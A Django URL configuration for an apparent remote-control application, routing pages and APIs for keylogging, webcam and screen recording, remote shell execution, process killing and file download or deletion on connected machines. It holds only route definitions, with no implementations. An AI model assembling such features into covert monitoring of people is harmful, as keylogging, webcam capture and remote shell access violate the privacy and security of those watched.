"""
URL Configuration for Remote Control App
"""

from django.urls import path

from . import views

app_name = 'remote_control'

urlpatterns = [
    # ==================== PAGE ROUTES ====================
    
    # Home
    path('home/', views.home_page, name='home'),
    
    # Feature Pages
    path('applications/', views.applications_page, name='applications'),
    path('processes/', views.processes_page, name='processes'),
    path('screenshot/', views.screenshot_page, name='screenshot'),
    path('keylogger/', views.keylogger_page, name='keylogger'),
    path('webcam/', views.webcam_page, name='webcam'),
    path('screen/', views.screen_page, name='screen'),
    path('shell/', views.shell_page, name='shell'),
    path('power/', views.power_page, name='power'),
    path('file-manager/', views.file_manager_page, name='file_manager'),
    
    # ==================== API ENDPOINTS ====================
    
    # Server Info & Discovery
    path('api/server-info/', views.server_info, name='api_server_info'),
    path('api/discover-servers/', views.discover_servers, name='api_discover_servers'),
    path('api/stats/', views.get_server_stats, name='api_server_stats'),
    
    # Connection Management
    path('api/connect-server/', views.connect_server, name='api_connect_server'),
    path('api/disconnect-server/', views.disconnect_server, name='api_disconnect_server'),
    
    # Process Management
    path('api/process/list/', views.get_processes, name='api_process_list'),
    path('api/process/kill/', views.kill_process, name='api_process_kill'),
    path('api/process/start/', views.start_process, name='api_process_start'),
    
    # Application Management
    path('api/app/list/', views.get_apps, name='api_app_list'),
    path('api/app/start-menu/', views.get_start_apps, name='api_app_start_menu'),
    path('api/app/kill/', views.kill_app, name='api_app_kill'),
    
    # Screenshot
    path('api/screenshot/', views.take_screenshot, name='api_screenshot'),
    
    # Keylogger
    path('api/keylog/status/', views.get_keylog_status, name='api_keylog_status'),
    path('api/keylog/get/', views.get_keylog, name='api_keylog_get'),
    path('api/keylog/hook/', views.hook_keylog, name='api_keylog_hook'),
    path('api/keylog/clear/', views.clear_keylog, name='api_keylog_clear'),
    
    # Shell (CMD)
    path('api/shell/execute/', views.execute_shell_command, name='api_shell_execute'),
    
    # Power Control
    path('api/power/<str:action_type>/', views.power_action_specific, name='api_power_specific'),
    
    # Webcam
    path('api/webcam/on/', views.webcam_on, name='api_webcam_on'),
    path('api/webcam/off/', views.webcam_off, name='api_webcam_off'),
    path('api/webcam/stream/', views.webcam_stream, name='api_webcam_stream'),
    path('api/webcam/start-recording/', views.webcam_start_recording, name='api_webcam_start_recording'),
    path('api/webcam/stop-recording/', views.webcam_stop_recording, name='api_webcam_stop_recording'),
    path('api/webcam/status/', views.webcam_status, name='api_webcam_status'),
    path('api/webcam/list/', views.webcam_list, name='api_webcam_list'),
    path('api/webcam/delete/<int:recording_id>/', views.webcam_delete, name='api_webcam_delete'),
    
    # Screen Recording
    path('api/screen/list/', views.screen_list, name='screen_list'),
    path('api/screen/on', views.screen_stream_on, name='screen_on'),
    path('api/screen/off', views.screen_stream_off, name='screen_off'),
    path('api/screen/stream', views.screen_stream_frame, name='screen_stream'),
    path('api/screen/record/start', views.screen_start_rec, name='screen_rec_start'),
    path('api/screen/record/stop', views.screen_stop_rec, name='screen_rec_stop'),
    path('api/screen/status/', views.screen_get_status, name='screen_status'),
    path('api/screen/delete/<int:recording_id>/', views.screen_delete, name='screen_delete'),
    
    # File Manager
    path('api/file/drives/', views.file_get_drives, name='api_file_drives'),
    path('api/file/list/', views.file_get_dir, name='api_file_list'),
    path('api/file/delete/', views.file_delete, name='api_file_delete'),
    path('api/file/download/', views.file_download, name='api_file_download'),
    
    # Download Recording (Secure)
    path('api/download/<str:rec_type>/<int:rec_id>/', views.download_recording, name='api_secure_download'),
]
